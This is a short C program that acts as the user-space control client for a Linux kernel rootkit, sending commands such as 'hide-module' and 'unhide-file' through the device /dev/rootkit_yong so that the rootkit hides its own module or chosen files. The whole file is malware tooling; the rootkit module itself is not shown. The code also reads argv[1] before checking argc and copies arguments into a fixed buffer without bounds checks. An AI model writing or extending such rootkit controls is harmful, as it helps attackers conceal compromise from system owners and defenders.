#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

#define MAX_ARG_LEN 1024

void usage(char* filename) {
	printf("Wrong command line argument!\n");
	return;
}

int main(int argc, char* argv[]) {
	int ret, fd;
	char message[MAX_ARG_LEN] = {0};

	fd = open("/dev/rootkit_yong", O_RDWR);
	if(fd < 0)
	{
		printf("device open failure!\n");
		return -1;
	}

	if (argc != 3) {
		if (strcmp(argv[1], "hide-module") == 0 || strcmp(argv[1], "unhide-module") == 0 || strcmp(argv[1], "unhide-file") == 0)
			;
		else {
			usage(argv[0]);
			return -1;
		}
	}

	strcpy(message, argv[1]);
	strcat(message, " ");
	if (argc == 3)
		strcat(message, argv[2]);

	ret = write(fd, message, 128);
	if (ret < 0)
	{
		printf("device write[1] failure!\n");
		return -1;
	}

	return 0;
}

